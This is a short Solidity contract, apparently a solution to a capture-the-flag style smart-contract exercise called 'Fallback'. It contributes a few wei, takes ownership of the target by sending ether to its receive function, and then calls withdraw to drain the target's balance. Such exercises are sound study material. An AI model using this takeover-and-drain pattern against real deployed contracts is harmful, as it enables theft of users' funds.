// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./fallback.sol";

contract AttackFallback {

    Fallback public fallbackContract;

    constructor(address fallbackContractAddress) {
        fallbackContract = Fallback(payable(fallbackContractAddress));
    }

    function makeContribution() public {
        fallbackContract.contribute{value: 3 wei}();
    }

    function getContribution() public view returns (uint) {
        return fallbackContract.getContribution();
    }

    function ownTheContract() public {
        payable(address(fallbackContract)).transfer(3 wei);
    }

    function lootContract() public {
        fallbackContract.withdraw();
    }

    receive() external payable {
        return ;
    }
}
